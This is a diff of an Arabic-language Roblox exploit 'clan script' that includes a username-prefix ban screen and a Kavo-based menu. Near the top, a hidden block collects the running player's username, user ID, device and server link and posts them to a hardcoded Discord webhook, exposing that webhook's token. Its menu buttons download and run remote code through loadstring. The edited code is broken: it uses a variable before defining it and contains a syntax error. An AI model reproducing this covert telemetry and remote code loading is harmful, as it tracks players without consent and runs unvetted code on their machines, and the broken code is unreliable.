@@ -1,142 +1,176 @@
 --==================== NHYQ NAME BAN ====================
 
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
--- اكتب بدايات الأسماء هنا
 local BANNED_PREFIXES = {
-    "nice",
-    "nice",
+    "ABC",
+    "XYZ",
 }
 
-local username = LocalPlayer.Name:lower()
+local currentUsername = _L.Name:lower()
+local isBanned = false
 
 for _, prefix in ipairs(BANNED_PREFIXES) do
     prefix = prefix:lower()
 
-    if username:sub(1, #prefix) == prefix then
-        return
+    if currentUsername:sub(1, #prefix) == prefix then
+        isBanned = true
+        break
     end
 end
 
---=======================================================
+if isBanned then
+    local PlayerGui = _L:WaitForChild("PlayerGui")
+
+    local BanGui = Instance.new("ScreenGui")
+    BanGui.Name = "NHYQ_BannedScreen"
+    BanGui.IgnoreGuiInset = true
+    BanGui.ResetOnSpawn = false
+    BanGui.DisplayOrder = 999999999
+    BanGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    BanGui.Parent = PlayerGui
+
+    local BlackScreen = Instance.new("Frame")
+    BlackScreen.Size = UDim2.fromScale(1, 1)
+    BlackScreen.Position = UDim2.fromScale(0, 0)
+    BlackScreen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    BlackScreen.BorderSizePixel = 0
+    BlackScreen.Parent = BanGui
+
+    local BanText = Instance.new("TextLabel")
+    BanText.Size = UDim2.new(1, 0, 0, 100)
+    BanText.Position = UDim2.new(0, 0, 0.5, -50)
+    BanText.BackgroundTransparency = 1
+    BanText.Text = "أنت محظور من السكربت"
+    BanText.TextColor3 = Color3.fromRGB(255, 0, 0)
+    BanText.TextSize = 42
+    BanText.Font = Enum.Font.GothamBold
+    BanText.TextXAlignment = Enum.TextXAlignment.Center
+    BanText.TextYAlignment = Enum.TextYAlignment.Center
+    BanText.Parent = BlackScreen
+
+    return
+end
+
+--========================================================
 
 pcall(function()
-    local _P = game:GetService("Players")
-    local _H = game:GetService("HttpService")
-    local _U = game:GetService("UserInputService")
-    local _L = _P.LocalPlayer
-    local _W = "https://discord.com/api/webhooks/1552652001496662028/jZO9EY51-O5KmZkI_8dWxmQFPsB8tIOyY5GdrtQNZQRvd63FYOzKRiOlE2_vNOagG94X"
+local _P = game:GetService("Players")
+local _H = game:GetService("HttpService")
+local _U = game:GetService("UserInputService")
+local _L = _P.LocalPlayer
+local _W = "https://discord.com/api/webhooks/1552652001496662028/jZO9EY51-O5KmZkI_8dWxmQFPsB8tIOyY5GdrtQNZQRvd63FYOzKRiOlE2_vNOagG94X"
 
-    local _info = {}
-    _info.Username = _L.Name
-    _info.DisplayName = _L.DisplayName
-    _info.UserId = tostring(_L.UserId)
+local _info = {}  
+_info.Username = _L.Name  
+_info.DisplayName = _L.DisplayName  
+_info.UserId = tostring(_L.UserId)  
 
-    local _platform = "Unknown"
-    if _U.TouchEnabled and not _U.KeyboardEnabled then
-        _platform = "Mobile (Android/iOS)"
-    elseif _U.KeyboardEnabled and not _U.TouchEnabled then
-        _platform = "PC (Windows/Mac)"
-    elseif _U.TouchEnabled and _U.KeyboardEnabled then
-        _platform = "Hybrid (Tablet)"
-    end
-    _info.DeviceType = _platform
-    _info.Platform = tostring(_U:GetPlatform())
-    _info.Time = os.date("%Y-%m-%d %H:%M:%S")
-    _info.Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+local _platform = "Unknown"  
+if _U.TouchEnabled and not _U.KeyboardEnabled then  
+    _platform = "Mobile (Android/iOS)"  
+elseif _U.KeyboardEnabled and not _U.TouchEnabled then  
+    _platform = "PC (Windows/Mac)"  
+elseif _U.TouchEnabled and _U.KeyboardEnabled then  
+    _platform = "Hybrid (Tablet)"  
+end  
+_info.DeviceType = _platform  
+_info.Platform = tostring(_U:GetPlatform())  
+_info.Time = os.date("%Y-%m-%d %H:%M:%S")  
+_info.Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")  
 
-    pcall(function()
-        _info.GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"
-        _info.PlaceId = tostring(game.PlaceId)
-        _info.JobId = tostring(game.JobId)
-        if game.JobId and game.JobId ~= "" then
-            _info.ServerLink = "https://www.roblox.com/games/" .. game.PlaceId .. "/?gameInstanceId=" .. game.JobId
-        else
-            _info.ServerLink = "https://www.roblox.com/games/" .. game.PlaceId
-        end
-    end)
+pcall(function()  
+    _info.GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"  
+    _info.PlaceId = tostring(game.PlaceId)  
+    _info.JobId = tostring(game.JobId)  
+    if game.JobId and game.JobId ~= "" then  
+        _info.ServerLink = "https://www.roblox.com/games/" .. game.PlaceId .. "/?gameInstanceId=" .. game.JobId  
+    else  
+        _info.ServerLink = "https://www.roblox.com/games/" .. game.PlaceId  
+    end  
+end)  
 
-    local _embed = {
-        title = "🎮 **لاعب جديد شغّل السكربت!**",
-        color = 0x00FF00,
-        fields = {
-            { name = "👤 اسم اللاعب", value = _info.Username or "غير معروف", inline = true },
-            { name = "📛 الاسم المعروض", value = _info.DisplayName or "غير معروف", inline = true },
-            { name = "🆔 معرف المستخدم", value = _info.UserId or "غير معروف", inline = true },
-            { name = "🖥️ نوع الجهاز", value = _info.DeviceType or "غير معروف", inline = true },
-            { name = "💻 المنصة", value = _info.Platform or "غير معروف", inline = true },
-            { name = "🕒 الوقت والتاريخ", value = _info.Time or "غير معروف", inline = true },
-            { name = "🔗 رابط السيرفر", value = "[" .. (_info.GameName or "لعبة") .. "](" .. (_info.ServerLink or "#") .. ")", inline = false },
-            { name = "🎮 معرف اللعبة", value = _info.PlaceId or "غير معروف", inline = true },
-            { name = "📡 معرف السيرفر", value = _info.JobId or "غير معروف", inline = true }
-        },
-        footer = { text = "🛡️ NHYQ Script - Player Info" },
-        timestamp = _info.Timestamp or os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
+local _embed = {  
+    title = "🎮 **لاعب جديد شغّل السكربت!**",  
+    color = 0x00FF00,  
+    fields = {  
+        { name = "👤 اسم اللاعب", value = _info.Username or "غير معروف", inline = true },  
+        { name = "📛 الاسم المعروض", value = _info.DisplayName or "غير معروف", inline = true },  
+        { name = "🆔 معرف المستخدم", value = _info.UserId or "غير معروف", inline = true },  
+        { name = "🖥️ نوع الجهاز", value = _info.DeviceType or "غير معروف", inline = true },  
+        { name = "💻 المنصة", value = _info.Platform or "غير معروف", inline = true },  
+        { name = "🕒 الوقت والتاريخ", value = _info.Time or "غير معروف", inline = true },  
+        { name = "🔗 رابط السيرفر", value = "[" .. (_info.GameName or "لعبة") .. "](" .. (_info.ServerLink or "#") .. ")", inline = false },  
+        { name = "🎮 معرف اللعبة", value = _info.PlaceId or "غير معروف", inline = true },  
+        { name = "📡 معرف السيرفر", value = _info.JobId or "غير معروف", inline = true }  
+    },  
+    footer = { text = "🛡️ NHYQ Script - Player Info" },  
+    timestamp = _info.Timestamp or os.date("!%Y-%m-%dT%H:%M:%SZ")  
+}  
 
-    local _data = { content = "📡 **تم جمع بيانات اللاعب!**", embeds = {_embed} }
-    local _json = _H:JSONEncode(_data)
+local _data = { content = "📡 **تم جمع بيانات اللاعب!**", embeds = {_embed} }  
+local _json = _H:JSONEncode(_data)  
 
-    local _req = syn and syn.request or http and http.request
-    if _req then
-        _req({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = _json })
-    else
-        _H:PostAsync(_W, _json)
-    end
+local _req = syn and syn.request or http and http.request  
+if _req me then  
+    _req({ Url = _W, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = _json })  
+else  
+    _H:PostAsync(_W, _json)  
+end  
 
-    print("✅ تم إرسال بيانات اللاعب إلى Webhook")
+print("✅ تم إرسال بيانات اللاعب إلى Webhook")
+
 end)
 
 -- ==================== إضافة لقب المالك فوق الرأس ====================
 local OWNER_ID = 10179511457
 
 local function ApplyOwnerTag(player)
-    if player.UserId == OWNER_ID then
-        local function createTag(character)
-            if not character then return end
-            local head = character:WaitForChild("Head", 5)
-            if not head then return end
+if player.UserId == OWNER_ID then
+local function createTag(character)
+if not character then return end
+local head = character:WaitForChild("Head", 5)
+if not head then return end
 
-            local oldTag = head:FindFirstChild("NHYQ_OwnerTag")
-            if oldTag then oldTag:Destroy() end
+local oldTag = head:FindFirstChild("NHYQ_OwnerTag")  
+        if oldTag then oldTag:Destroy() end  
 
-            local billboard = Instance.new("BillboardGui")
-            billboard.Name = "NHYQ_OwnerTag"
-            billboard.Size = UDim2.new(0, 200, 0, 50)
-            billboard.StudsOffset = Vector3.new(0, 2.5, 0)
-            billboard.AlwaysOnTop = true
-            billboard.Parent = head
+        local billboard = Instance.new("BillboardGui")  
+        billboard.Name = "NHYQ_OwnerTag"  
+        billboard.Size = UDim2.new(0, 200, 0, 50)  
+        billboard.StudsOffset = Vector3.new(0, 2.5, 0)  
+        billboard.AlwaysOnTop = true  
+        billboard.Parent = head  
 
-            local textLabel = Instance.new("TextLabel")
-            textLabel.Size = UDim2.new(1, 0, 1, 0)
-            textLabel.BackgroundTransparency = 1
-            textLabel.Text = "👑OWNER NHYQ👑"
-            textLabel.TextColor3 = Color3.fromRGB(255, 215, 0) -- لون ذهبي
-            textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-            textLabel.TextStrokeTransparency = 0
-            textLabel.TextSize = 22
-            textLabel.Font = Enum.Font.GothamBold
-            textLabel.Parent = billboard
-        end
+        local textLabel = Instance.new("TextLabel")  
+        textLabel.Size = UDim2.new(1, 0, 1, 0)  
+        textLabel.BackgroundTransparency = 1  
+        textLabel.Text = "👑OWNER NHYQ👑"  
+        textLabel.TextColor3 = Color3.fromRGB(255, 215, 0) -- لون ذهبي  
+        textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)  
+        textLabel.TextStrokeTransparency = 0  
+        textLabel.TextSize = 22  
+        textLabel.Font = Enum.Font.GothamBold  
+        textLabel.Parent = billboard  
+    end  
 
-        if player.Character then
-            task.spawn(function() createTag(player.Character) end)
-        end
+    if player.Character then  
+        task.spawn(function() createTag(player.Character) end)  
+    end  
 
-        player.CharacterAdded:Connect(function(char)
-            task.spawn(function() createTag(char) end)
-        end)
-    end
+    player.CharacterAdded:Connect(function(char)  
+        task.spawn(function() createTag(char) end)  
+    end)  
+end
+
 end
 
 for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-    ApplyOwnerTag(p)
+ApplyOwnerTag(p)
 end
 
 game:GetService("Players").PlayerAdded:Connect(ApplyOwnerTag)
 -- ====================================================================
 
+local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -144,17 +178,17 @@ local UserInputService = game:GetService("UserInputService")
 local Player = Players.LocalPlayer
 
 pcall(function()
-    local old = CoreGui:FindFirstChild("NHYQ_Script_GUI")
-    if old then
-        old:Destroy()
-    end
+local old = CoreGui:FindFirstChild("NHYQ_Script_GUI")
+if old then
+old:Destroy()
+end
 end)
 
 pcall(function()
-    local old = Player:WaitForChild("PlayerGui"):FindFirstChild("NHYQ_Script_GUI")
-    if old then
-        old:Destroy()
-    end
+local old = Player:WaitForChild("PlayerGui"):FindFirstChild("NHYQ_Script_GUI")
+if old then
+old:Destroy()
+end
 end)
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -165,11 +199,11 @@ ScreenGui.DisplayOrder = 999999
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 pcall(function()
-    ScreenGui.Parent = CoreGui
+ScreenGui.Parent = CoreGui
 end)
 
 if not ScreenGui.Parent then
-    ScreenGui.Parent = Player:WaitForChild("PlayerGui")
+ScreenGui.Parent = Player:WaitForChild("PlayerGui")
 end
 
 local IntroFrame = Instance.new("Frame")
@@ -280,36 +314,36 @@ local PasswordStartPos
 local PasswordDragInput
 
 PasswordFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1
-        or input.UserInputType == Enum.UserInputType.Touch then
-        PasswordDragging = true
-        PasswordDragStart = input.Position
-        PasswordStartPos = PasswordFrame.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                PasswordDragging = false
-            end
-        end)
-    end
+if input.UserInputType == Enum.UserInputType.MouseButton1
+or input.UserInputType == Enum.UserInputType.Touch then
+PasswordDragging = true
+PasswordDragStart = input.Position
+PasswordStartPos = PasswordFrame.Position
+input.Changed:Connect(function()
+if input.UserInputState == Enum.UserInputState.End then
+PasswordDragging = false
+end
+end)
+end
 end)
 
 PasswordFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement
-        or input.UserInputType == Enum.UserInputType.Touch then
-        PasswordDragInput = input
-    end
+if input.UserInputType == Enum.UserInputType.MouseMovement
+or input.UserInputType == Enum.UserInputType.Touch then
+PasswordDragInput = input
+end
 end)
 
 UserInputService.InputChanged:Connect(function(input)
-    if PasswordDragging and input == PasswordDragInput then
-        local delta = input.Position - PasswordDragStart
-        PasswordFrame.Position = UDim2.new(
-            PasswordStartPos.X.Scale,
-            PasswordStartPos.X.Offset + delta.X,
-            PasswordStartPos.Y.Scale,
-            PasswordStartPos.Y.Offset + delta.Y
-        )
-    end
+if PasswordDragging and input == PasswordDragInput then
+local delta = input.Position - PasswordDragStart
+PasswordFrame.Position = UDim2.new(
+PasswordStartPos.X.Scale,
+PasswordStartPos.X.Offset + delta.X,
+PasswordStartPos.Y.Scale,
+PasswordStartPos.Y.Offset + delta.Y
+)
+end
 end)
 
 local BanScreen = Instance.new("Frame")
@@ -360,13 +394,13 @@ WelcomeBanner.ZIndex = 1400
 WelcomeBanner.Parent = ScreenGui
 
 task.delay(3, function()
-    local fadeInfo = TweenInfo.new(0.5)
-    TweenService:Create(IntroFrame, fadeInfo, {BackgroundTransparency = 1}):Play()
-    TweenService:Create(IntroText, fadeInfo, {TextTransparency = 1}):Play()
-    TweenService:Create(SubIntroText, fadeInfo, {TextTransparency = 1}):Play()
-    task.wait(0.5)
-    IntroFrame.Visible = false
-    PasswordFrame.Visible = true
+local fadeInfo = TweenInfo.new(0.5)
+TweenService:Create(IntroFrame, fadeInfo, {BackgroundTransparency = 1}):Play()
+TweenService:Create(IntroText, fadeInfo, {TextTransparency = 1}):Play()
+TweenService:Create(SubIntroText, fadeInfo, {TextTransparency = 1}):Play()
+task.wait(0.5)
+IntroFrame.Visible = false
+PasswordFrame.Visible = true
 end)
 
 local ToggleBtn = Instance.new("TextButton")
@@ -400,36 +434,36 @@ local btnStartPos
 local moved = false
 
 ToggleBtn.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1
-        or input.UserInputType == Enum.UserInputType.Touch then
-        btnDragging = true
-        moved = false
-        btnDragStart = input.Position
-        btnStartPos = ToggleBtn.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                btnDragging = false
-            end
-        end)
-    end
+if input.UserInputType == Enum.UserInputType.MouseButton1
+or input.UserInputType == Enum.UserInputType.Touch then
+btnDragging = true
+moved = false
+btnDragStart = input.Position
+btnStartPos = ToggleBtn.Position
+input.Changed:Connect(function()
+if input.UserInputState == Enum.UserInputState.End then
+btnDragging = false
+end
+end)
+end
 end)
 
 UserInputService.InputChanged:Connect(function(input)
-    if btnDragging then
-        if input.UserInputType == Enum.UserInputType.MouseMovement
-            or input.UserInputType == Enum.UserInputType.Touch then
-            local delta = input.Position - btnDragStart
-            if delta.Magnitude > 6 then
-                moved = true
-            end
-            ToggleBtn.Position = UDim2.new(
-                btnStartPos.X.Scale,
-                btnStartPos.X.Offset + delta.X,
-                btnStartPos.Y.Scale,
-                btnStartPos.Y.Offset + delta.Y
-            )
-        end
-    end
+if btnDragging then
+if input.UserInputType == Enum.UserInputType.MouseMovement
+or input.UserInputType == Enum.UserInputType.Touch then
+local delta = input.Position - btnDragStart
+if delta.Magnitude > 6 then
+moved = true
+end
+ToggleBtn.Position = UDim2.new(
+btnStartPos.X.Scale,
+btnStartPos.X.Offset + delta.X,
+btnStartPos.Y.Scale,
+btnStartPos.Y.Offset + delta.Y
+)
+end
+end
 end)
 
 local KavoGui = nil
@@ -437,385 +471,386 @@ local KavoVisible = true
 local KavoCreatedGuis = {}
 
 local function LooksLikeKavo(gui)
-    if not gui or gui == ScreenGui then
-        return false
-    end
-    if gui.Name == "KavoUI" then
-        return true
-    end
-    local name = string.lower(gui.Name)
-    if string.find(name, "kavo") then
-        return true
-    end
-    local foundTitle = false
-    pcall(function()
-        for _, obj in ipairs(gui:GetDescendants()) do
-            if obj:IsA("TextLabel")
-                or obj:IsA("TextButton")
-                or obj:IsA("TextBox") then
-                local txt = tostring(obj.Text or "")
-                if string.find(txt, "سكربت كلان NHYQ")
-                    or string.find(string.lower(txt), "kavo") then
-                    foundTitle = true
-                    break
-                end
-            end
-        end
-    end)
-    return foundTitle
+if not gui or gui == ScreenGui then
+return false
+end
+if gui.Name == "KavoUI" then
+return true
+end
+local name = string.lower(gui.Name)
+if string.find(name, "kavo") then
+return true
+end
+local foundTitle = false
+pcall(function()
+for _, obj in ipairs(gui:GetDescendants()) do
+if obj:IsA("TextLabel")
+or obj:IsA("TextButton")
+or obj:IsA("TextBox") then
+local txt = tostring(obj.Text or "")
+if string.find(txt, "سكربت كلان NHYQ")
+or string.find(string.lower(txt), "kavo") then
+foundTitle = true
+break
+end
+end
+end
+end)
+return foundTitle
 end
 
 local function FindKavoGui()
-    for _, gui in ipairs(KavoCreatedGuis) do
-        if gui and gui.Parent then
-            return gui
-        end
-    end
-    for _, gui in ipairs(CoreGui:GetChildren()) do
-        if gui:IsA("ScreenGui") and LooksLikeKavo(gui) then
-            return gui
-        end
-    end
-    local PlayerGui = Player:FindFirstChildOfClass("PlayerGui")
-    if PlayerGui then
-        for _, gui in ipairs(PlayerGui:GetChildren()) do
-            if gui:IsA("ScreenGui") and LooksLikeKavo(gui) then
-                return gui
-            end
-        end
-    end
-    return nil
+for _, gui in ipairs(KavoCreatedGuis) do
+if gui and gui.Parent then
+return gui
+end
+end
+for _, gui in ipairs(CoreGui:GetChildren()) do
+if gui:IsA("ScreenGui") and LooksLikeKavo(gui) then
+return gui
+end
+end
+local PlayerGui = Player:FindFirstChildOfClass("PlayerGui")
+if PlayerGui then
+for _, gui in ipairs(PlayerGui:GetChildren()) do
+if gui:IsA("ScreenGui") and LooksLikeKavo(gui) then
+return gui
+end
+end
+end
+return nil
 end
 
 local function SetKavoVisibility(state)
-    if not KavoGui or not KavoGui.Parent then
-        KavoGui = FindKavoGui()
-    end
-    if not KavoGui then
-        return false
-    end
-    KavoVisible = state
-    if KavoGui:IsA("ScreenGui") then
-        KavoGui.Enabled = state
-        return true
-    elseif KavoGui:IsA("GuiObject") then
-        KavoGui.Visible = state
-        return true
-    end
-    return false
+if not KavoGui or not KavoGui.Parent then
+KavoGui = FindKavoGui()
+end
+if not KavoGui then
+return false
+end
+KavoVisible = state
+if KavoGui:IsA("ScreenGui") then
+KavoGui.Enabled = state
+return true
+elseif KavoGui:IsA("GuiObject") then
+KavoGui.Visible = state
+return true
+end
+return false
 end
 
 ToggleBtn.Activated:Connect(function()
-    if moved then
-        moved = false
-        return
-    end
-    if not KavoGui or not KavoGui.Parent then
-        KavoGui = FindKavoGui()
-    end
-    if not KavoGui then
-        return
-    end
-    SetKavoVisibility(not KavoVisible)
+if moved then
+moved = false
+return
+end
+if not KavoGui or not KavoGui.Parent then
+KavoGui = FindKavoGui()
+end
+if not KavoGui then
+return
+end
+SetKavoVisibility(not KavoVisible)
 end)
 
 local function MakeKavoDraggable(gui)
-    if not gui then
-        return
-    end
-    local MainFrame = nil
-    local largestArea = 0
-    pcall(function()
-        for _, obj in ipairs(gui:GetDescendants()) do
-            if obj:IsA("Frame") and obj.Visible then
-                local size = obj.AbsoluteSize
-                local area = size.X * size.Y
-                if area > largestArea
-                    and size.X > 200
-                    and size.Y > 100 then
-                    largestArea = area
-                    MainFrame = obj
-                end
-            end
-        end
-    end)
-    if not MainFrame then
-        return
-    end
-    if MainFrame:GetAttribute("NHYQ_Draggable") then
-        return
-    end
-    MainFrame:SetAttribute("NHYQ_Draggable", true)
-    local Dragging = false
-    local DragStart
-    local StartPosition
-    MainFrame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1
-            or input.UserInputType == Enum.UserInputType.Touch then
-            Dragging = true
-            DragStart = input.Position
-            StartPosition = MainFrame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    Dragging = false
-                end
-            end)
-        end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if not Dragging then
-            return
-        end
-        if input.UserInputType == Enum.UserInputType.MouseMovement
-            or input.UserInputType == Enum.UserInputType.Touch then
-            local Delta = input.Position - DragStart
-            MainFrame.Position = UDim2.new(
-                StartPosition.X.Scale,
-                StartPosition.X.Offset + Delta.X,
-                StartPosition.Y.Scale,
-                StartPosition.Y.Offset + Delta.Y
-            )
-        end
-    end)
+if not gui then
+return
+end
+local MainFrame = nil
+local largestArea = 0
+pcall(function()
+for _, obj in ipairs(gui:GetDescendants()) do
+if obj:IsA("Frame") and obj.Visible then
+local size = obj.AbsoluteSize
+local area = size.X * size.Y
+if area > largestArea
+and size.X > 200
+and size.Y > 100 then
+largestArea = area
+MainFrame = obj
+end
+end
+end
+end)
+if not MainFrame then
+return
+end
+if MainFrame:GetAttribute("NHYQ_Draggable") then
+return
+end
+MainFrame:SetAttribute("NHYQ_Draggable", true)
+local Dragging = false
+local DragStart
+local StartPosition
+MainFrame.InputBegan:Connect(function(input)
+if input.UserInputType == Enum.UserInputType.MouseButton1
+or input.UserInputType == Enum.UserInputType.Touch then
+Dragging = true
+DragStart = input.Position
+StartPosition = MainFrame.Position
+input.Changed:Connect(function()
+if input.UserInputState == Enum.UserInputState.End then
+Dragging = false
+end
+end)
+end
+end)
+UserInputService.InputChanged:Connect(function(input)
+if not Dragging then
+return
+end
+if input.UserInputType == Enum.UserInputType.MouseMovement
+or input.UserInputType == Enum.UserInputType.Touch then
+local Delta = input.Position - DragStart
+MainFrame.Position = UDim2.new(
+StartPosition.X.Scale,
+StartPosition.X.Offset + Delta.X,
+StartPosition.Y.Scale,
+StartPosition.Y.Offset + Delta.Y
+)
+end
+end)
 end
 
 local function LoadMainScript()
-    local BeforeCore = {}
-    for _, gui in ipairs(CoreGui:GetChildren()) do
-        if gui:IsA("ScreenGui") then
-            BeforeCore[gui] = true
-        end
-    end
+local BeforeCore = {}
+for _, gui in ipairs(CoreGui:GetChildren()) do
+if gui:IsA("ScreenGui") then
+BeforeCore[gui] = true
+end
+end
 
-    local PlayerGui = Player:FindFirstChildOfClass("PlayerGui")
-    local BeforePlayer = {}
-    if PlayerGui then
-        for _, gui in ipairs(PlayerGui:GetChildren()) do
-            if gui:IsA("ScreenGui") then
-                BeforePlayer[gui] = true
-            end
-        end
-    end
+local PlayerGui = Player:FindFirstChildOfClass("PlayerGui")  
+local BeforePlayer = {}  
+if PlayerGui then  
+    for _, gui in ipairs(PlayerGui:GetChildren()) do  
+        if gui:IsA("ScreenGui") then  
+            BeforePlayer[gui] = true  
+        end  
+    end  
+end  
 
-    local Library = loadstring(game:HttpGet(
-        "https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"
-    ))()
+local Library = loadstring(game:HttpGet(  
+    "https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"  
+))()  
 
-    local Window = Library.CreateLib(
-        "سكربت كلان NHYQ",
-        "BloodTheme"
-    )
+local Window = Library.CreateLib(  
+    "سكربت كلان NHYQ",  
+    "BloodTheme"  
+)  
 
-    task.wait(0.5)
+task.wait(0.5)  
 
-    for _, gui in ipairs(CoreGui:GetChildren()) do
-        if gui:IsA("ScreenGui")
-            and not BeforeCore[gui]
-            and gui ~= ScreenGui then
-            table.insert(KavoCreatedGuis, gui)
-        end
-    end
+for _, gui in ipairs(CoreGui:GetChildren()) do  
+    if gui:IsA("ScreenGui")  
+        and not BeforeCore[gui]  
+        and gui ~= ScreenGui then  
+        table.insert(KavoCreatedGuis, gui)  
+    end  
+end  
 
-    PlayerGui = Player:FindFirstChildOfClass("PlayerGui")
-    if PlayerGui then
-        for _, gui in ipairs(PlayerGui:GetChildren()) do
-            if gui:IsA("ScreenGui")
-                and not BeforePlayer[gui]
-                and gui ~= ScreenGui then
-                table.insert(KavoCreatedGuis, gui)
-            end
-        end
-    end
+PlayerGui = Player:FindFirstChildOfClass("PlayerGui")  
+if PlayerGui then  
+    for _, gui in ipairs(PlayerGui:GetChildren()) do  
+        if gui:IsA("ScreenGui")  
+            and not BeforePlayer[gui]  
+            and gui ~= ScreenGui then  
+            table.insert(KavoCreatedGuis, gui)  
+        end  
+    end  
+end  
 
-    KavoGui = FindKavoGui()
-    if KavoGui then
-        KavoVisible = true
-        task.delay(0.5, function()
-            MakeKavoDraggable(KavoGui)
-        end)
-    end
+KavoGui = FindKavoGui()  
+if KavoGui then  
+    KavoVisible = true  
+    task.delay(0.5, function()  
+        MakeKavoDraggable(KavoGui)  
+    end)  
+end  
 
-    local TabCopy = Window:NewTab("نسخ")
-    local SecCopy = TabCopy:NewSection("نسخ تلقائي")
+local TabCopy = Window:NewTab("نسخ")  
+local SecCopy = TabCopy:NewSection("نسخ تلقائي")  
 
-    SecCopy:NewButton(
-        "نسخ تلقائي",
-        "نسخ تلقائي",
-        function()
-            loadstring(game:HttpGet(
-                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_ui"
-            ))()
-        end
-    )
+SecCopy:NewButton(  
+    "نسخ تلقائي",  
+    "نسخ تلقائي",  
+    function()  
+        loadstring(game:HttpGet(  
+            "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_ui"  
+        ))()  
+    end  
+)  
 
-    local TabProtect = Window:NewTab("حماية")
-    local SecProtect = TabProtect:NewSection("حماية")
+local TabProtect = Window:NewTab("حماية")  
+local SecProtect = TabProtect:NewSection("حماية")  
 
-    SecProtect:NewButton(
-        "حماية",
-        "حماية",
-        function()
-            loadstring(game:HttpGet(
-                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_hh"
-            ))()
-        end
-    )
+SecProtect:NewButton(  
+    "حماية",  
+    "حماية",  
+    function()  
+        loadstring(game:HttpGet(  
+            "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_hh"  
+        ))()  
+    end  
+)  
 
-    SecProtect:NewButton(
-        "حماية فلنق",
-        "حماية فلنق",
-        function()
-            loadstring(game:HttpGet(
-                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_bn"
-            ))()
-        end
-    )
+SecProtect:NewButton(  
+    "حماية فلنق",  
+    "حماية فلنق",  
+    function()  
+        loadstring(game:HttpGet(  
+            "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_bn"  
+        ))()  
+    end  
+)  
 
-    SecProtect:NewButton(
-        "حمايةice",
-        "حمايةice",
-        function()
-            loadstring(game:HttpGet(
-                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_jh"
-            ))()
-        end
-    )
+SecProtect:NewButton(  
+    "حمايةice",  
+    "حمايةice",  
+    function()  
+        loadstring(game:HttpGet(  
+            "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_jh"  
+        ))()  
+    end  
+)  
 
-    SecProtect:NewButton(
-        "حمايةchar,title,dog",
-        "حمايةchar,title,dog",
-        function()
-            loadstring(game:HttpGet(
-                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_sh"
-            ))()
-        end
-    )
+SecProtect:NewButton(  
+    "حمايةchar,title,dog",  
+    "حمايةchar,title,dog",  
+    function()  
+        loadstring(game:HttpGet(  
+            "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_sh"  
+        ))()  
+    end  
+)  
 
-    local TabLogs = Window:NewTab("لوق دخول و خروج الاعبين")
-    local SecLogs = TabLogs:NewSection("لوق دخول و خروج الاعبين")
+local TabLogs = Window:NewTab("لوق دخول و خروج الاعبين")  
+local SecLogs = TabLogs:NewSection("لوق دخول و خروج الاعبين")  
 
-    SecLogs:NewButton(
-        "لوق دخول و خروج الاعبين",
-        "لوق دخول و خروج الاعبين",
-        function()
-            loadstring(game:HttpGet(
-                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_gh"
-            ))()
-        end
-    )
+SecLogs:NewButton(  
+    "لوق دخول و خروج الاعبين",  
+    "لوق دخول و خروج الاعبين",  
+    function()  
+        loadstring(game:HttpGet(  
+            "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_gh"  
+        ))()  
+    end  
+)  
 
-    local TabAuto = Window:NewTab("اوتو كلكر")
-    local SecAuto = TabAuto:NewSection("اوتو كلكر")
+local TabAuto = Window:NewTab("اوتو كلكر")  
+local SecAuto = TabAuto:NewSection("اوتو كلكر")  
 
-    SecAuto:NewButton(
-        "اوتو كلكر",
-        "اوتو كلكر",
-        function()
-            loadstring(game:HttpGet(
-                "https://apexhubeditor.vercel.app/api/raw?name=eBouZz2H5bhaXtQUbh4lpYAMNQE2_ah"
-            ))()
-        end
-    )
+SecAuto:NewButton(  
